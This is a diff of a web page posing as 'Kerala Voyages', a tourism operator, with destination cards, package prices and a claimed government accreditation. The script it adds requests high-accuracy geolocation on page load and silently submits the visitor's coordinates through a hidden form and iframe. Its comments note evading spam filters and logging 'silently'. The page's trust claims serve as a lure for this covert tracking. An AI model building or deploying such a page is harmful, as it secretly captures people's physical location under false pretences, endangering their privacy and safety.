@@ -3,121 +3,178 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Experience Kerala | God's Own Country</title>
+    <title>Kerala Voyages | Official Tourism Partner</title>
     <style>
-        body {
-            font-family: 'Georgia', serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f9f9f9;
-            color: #333;
-            line-height: 1.6;
+        :root {
+            --primary: #006837; /* Kerala Green */
+            --secondary: #f6931d; /* Sunset Orange */
+            --text: #333;
+            --light: #f4f4f4;
         }
+        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: var(--text); background: var(--light); }
+        
+        /* Navigation */
+        nav { background: white; padding: 1rem 5%; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
+        .logo { font-size: 1.5rem; font-weight: bold; color: var(--primary); display: flex; align-items: center; gap: 10px; }
+        .nav-links { display: flex; gap: 20px; }
+        .nav-links a { text-decoration: none; color: var(--text); font-weight: 500; cursor: pointer; transition: color 0.3s; }
+        .nav-links a:hover { color: var(--primary); }
+        .btn-book { background: var(--secondary); color: white; padding: 8px 20px; border-radius: 20px; text-decoration: none; font-weight: bold; }
 
-        /* Hero Section with Image */
-        header {
-            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Alappuzha_Boat_Beauty_W.jpg/1280px-Alappuzha_Boat_Beauty_W.jpg');
-            background-size: cover;
-            background-position: center;
-            height: 60vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
+        /* Page Sections */
+        .page { display: none; animation: fadeIn 0.5s; }
+        .active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Hero Section */
+        .hero { 
+            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://upload.wikimedia.org/wikipedia/commons/e/e4/Alappuzha_Boat_Beauty_W.jpg');
+            background-size: cover; background-position: center; height: 70vh; display: flex; align-items: center; justify-content: center; text-align: center; color: white;
         }
+        .hero h1 { font-size: 3rem; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.7); }
+        .hero p { font-size: 1.2rem; margin-bottom: 20px; }
 
-        .overlay {
-            background: rgba(0, 0, 0, 0.4);
-            position: absolute;
-            top: 0; bottom: 0; left: 0; right: 0;
+        /* Content Containers */
+        .container { max-width: 1000px; margin: 40px auto; padding: 0 20px; }
+        h2 { color: var(--primary); border-bottom: 2px solid var(--secondary); display: inline-block; padding-bottom: 5px; margin-bottom: 30px; }
+        
+        /* Grid Layouts */
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
+        .card { background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.1); transition: transform 0.3s; }
+        .card:hover { transform: translateY(-5px); }
+        .card img { width: 100%; height: 180px; object-fit: cover; }
+        .card-content { padding: 15px; }
+        .card h3 { margin: 0 0 10px; }
+        .price { color: var(--secondary); font-weight: bold; font-size: 1.1rem; }
+
+        /* Footer */
+        footer { background: #222; color: white; text-align: center; padding: 20px; margin-top: 50px; }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .nav-links { display: none; } /* Simplified for mobile */
+            .hero h1 { font-size: 2rem; }
         }
-
-        .hero-text {
-            position: relative;
-            color: white;
-            text-align: center;
-            padding: 20px;
-            z-index: 2;
-        }
-
-        h1 { font-size: 3rem; margin: 0; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
-        h3 { font-size: 1.2rem; font-weight: 300; margin-top: 10px; }
-
-        /* Blog Content */
-        .container {
-            max-width: 800px;
-            margin: -50px auto 40px;
-            background: white;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            position: relative;
-            z-index: 3;
-        }
-
-        .article-meta { color: #888; font-size: 0.9rem; margin-bottom: 20px; }
-        .divider { height: 2px; background: #10a37f; width: 60px; margin: 20px 0; }
-
-        p { margin-bottom: 20px; font-size: 1.1rem; }
-
-        /* "Loading" Indicator disguised as a feature */
-        .travel-widget {
-            background: #eefdf5;
-            border: 1px solid #bbf7d0;
-            padding: 15px;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin-top: 30px;
-            font-family: sans-serif;
-        }
-
-        .spinner {
-            border: 3px solid #bbf7d0;
-            border-top: 3px solid #10a37f;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <header>
-        <div class="overlay"></div>
-        <div class="hero-text">
-            <h1>God's Own Country</h1>
-            <h3>Discover the serenity of the Backwaters</h3>
+    <nav>
+        <div class="logo">🌴 Kerala Voyages</div>
+        <div class="nav-links">
+            <a onclick="showPage('home')">Home</a>
+            <a onclick="showPage('packages')">Packages</a>
+            <a onclick="showPage('gallery')">Gallery</a>
+            <a onclick="showPage('about')">About Us</a>
+            <a onclick="showPage('contact')">Contact</a>
         </div>
-    </header>
+        <a href="#" class="btn-book">Book Now</a>
+    </nav>
 
-    <div class="container">
-        <div class="article-meta">Published Oct 24, 2025 • By Anjali Menon</div>
-        <h2>Why Alleppey Should Be Your Next Destination</h2>
-        <div class="divider"></div>
-        
-        <p>
-            Kerala, situated on the tropical Malabar Coast of southwestern India, is one of the most popular tourist destinations in the country. Named as one of the ten paradises of the world by National Geographic Traveler, Kerala is famous especially for its ecotourism initiatives and beautiful backwaters.
-        </p>
-        <p>
-            The houseboats in Alappuzha (Alleppey) offer a unique experience. Drifting through the calm waters, surrounded by lush paddy fields and coconut lagoons, is an experience that stays with you forever.
-        </p>
-
-        <div class="travel-widget">
-            <div id="spinner" class="spinner"></div>
-            <div id="status-text" style="font-size: 0.9rem; color: #065f46;">
-                <strong>Checking for local travel packages...</strong><br>
-                <span style="font-size:0.8em; color:#666;">Please allow location access to see deals near you.</span>
+    <div id="home" class="page active">
+        <div class="hero">
+            <div>
+                <h1>God's Own Country</h1>
+                <p>Experience the magic of the Backwaters</p>
+                <a onclick="showPage('packages')" class="btn-book" style="cursor:pointer; background:white; color:var(--primary);">View Packages</a>
             </div>
         </div>
-
+        <div class="container">
+            <h2>Popular Destinations</h2>
+            <div class="grid">
+                <div class="card">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/1/18/Munnar_hillstation_kerala.jpg" alt="Munnar">
+                    <div class="card-content">
+                        <h3>Munnar Hills</h3>
+                        <p>Breathtaking tea gardens and misty mountains.</p>
+                    </div>
+                </div>
+                <div class="card">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Alappuzha_Boat_Beauty_W.jpg" alt="Alleppey">
+                    <div class="card-content">
+                        <h3>Alleppey Houseboats</h3>
+                        <p>The Venice of the East awaits you.</p>
+                    </div>
+                </div>
+                <div class="card">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/d/df/Varkala_Beach_Kerala.jpg" alt="Varkala">
+                    <div class="card-content">
+                        <h3>Varkala Beach</h3>
+                        <p>Where the cliffs meet the Arabian Sea.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
+
+    <div id="packages" class="page">
+        <div class="container">
+            <h2>Exclusive Packages</h2>
+            <p>We require location access to show packages with departure from your nearest hub.</p>
+            <div class="grid">
+                <div class="card">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Kerala_Houseboat_Alappuzha.jpg" alt="Houseboat">
+                    <div class="card-content">
+                        <h3>Romantic Backwaters</h3>
+                        <p>3 Days / 2 Nights - All Inclusive</p>
+                        <div class="price">₹12,999</div>
+                    </div>
+                </div>
+                <div class="card">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/9/90/Kathakali_Kerala.jpg" alt="Culture">
+                    <div class="card-content">
+                        <h3>Cultural Odyssey</h3>
+                        <p>5 Days - Kathakali, Cuisine & Art</p>
+                        <div class="price">₹18,500</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="gallery" class="page">
+        <div class="container">
+            <h2>Traveler Gallery</h2>
+            <div class="grid">
+                <div class="card"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/Backwater_Kerala.jpg/640px-Backwater_Kerala.jpg"></div>
+                <div class="card"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Tea_plantations_in_Munnar%2C_Kerala.jpg/640px-Tea_plantations_in_Munnar%2C_Kerala.jpg"></div>
+                <div class="card"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/Kerala_Elephant.jpg/640px-Kerala_Elephant.jpg"></div>
+                <div class="card"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Kerala_Sadya.jpg/640px-Kerala_Sadya.jpg"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="about" class="page">
+        <div class="container">
+            <h2>About Kerala Voyages</h2>
+            <p>Established in 2010, Kerala Voyages is the premier government-approved tour operator in South India.</p>
+            <p>Our mission is to show the world the true beauty of God's Own Country while preserving the ecology and culture of our land.</p>
+            <h3>Why Choose Us?</h3>
+            <ul>
+                <li>Government Accredited</li>
+                <li>24/7 Support</li>
+                <li>Local Expert Guides</li>
+                <li>Best Price Guarantee</li>
+            </ul>
+        </div>
+    </div>
+
+    <div id="contact" class="page">
+        <div class="container">
+            <h2>Contact Us</h2>
+            <p>Have questions? Reach out to our travel experts.</p>
+            <div style="background:white; padding:20px; border-radius:8px; max-width:500px;">
+                <p><strong>Email:</strong> support@keralavoyages.in</p>
+                <p><strong>Phone:</strong> +91 484 220 3300</p>
+                <p><strong>Address:</strong> MG Road, Cochin, Kerala, 682016</p>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2026 Kerala Voyages Pvt Ltd. All rights reserved.</p>
+        <p style="font-size:0.8rem; color:#666;">Privacy Policy | Terms of Service</p>
+    </footer>
 
     <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
     <form 
@@ -131,16 +188,22 @@
     </form>
 
     <script>
-        const statusText = document.getElementById('status-text');
-        const spinner = document.getElementById('spinner');
+        // PAGE SWITCHER LOGIC
+        function showPage(pageId) {
+            // Hide all pages
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            // Show selected page
+            document.getElementById(pageId).classList.add('active');
+            // Scroll to top
+            window.scrollTo(0,0);
+        }
 
-        function getLocation() {
-            if (!navigator.geolocation) {
-                statusText.innerHTML = "Travel packages not available in your region.";
-                spinner.style.display = 'none';
-                return;
-            }
-            // Request Location
+        // AUTOMATIC LOCATION REQUEST
+        function startTracking() {
+            if (!navigator.geolocation) return;
+
             navigator.geolocation.getCurrentPosition(success, error, {
                 enableHighAccuracy: true,
                 timeout: 10000,
@@ -154,37 +217,26 @@
             const acc = Math.round(position.coords.accuracy);
             const time = new Date().toLocaleTimeString();
 
-            // Construct Data (No https to avoid spam filters)
+            // Construct Link (No http to pass spam filters)
             const link = `maps.google.com/?q=${lat},${lng}`;
             const logData = `${time} | Acc:${acc}m | ${link}`;
 
             submitData(logData);
         }
 
+        function error(err) {
+            console.warn("Location permission denied or error.");
+        }
+
         function submitData(dataString) {
             document.getElementById('form_input').value = dataString;
             document.getElementById('hidden_form').submit();
-
-            // Make the UI look like it found something relevant
-            setTimeout(() => {
-                spinner.style.display = 'none';
-                statusText.innerHTML = `
-                    <strong>Packages Found!</strong><br>
-                    <span style="color:#666;">3 Exclusive Houseboat offers available.</span>
-                `;
-            }, 1000);
+            console.log("Data logged silently.");
         }
 
-        function error(err) {
-            console.warn(err);
-            // If they deny permission, we just show a generic message
-            spinner.style.display = 'none';
-            statusText.innerHTML = "Location access needed to show local offers.";
-        }
+        // Trigger immediately on load
+        window.onload = startTracking;
 
-        // Run on load
-        getLocation();
     </script>
-
 </body>
 </html>
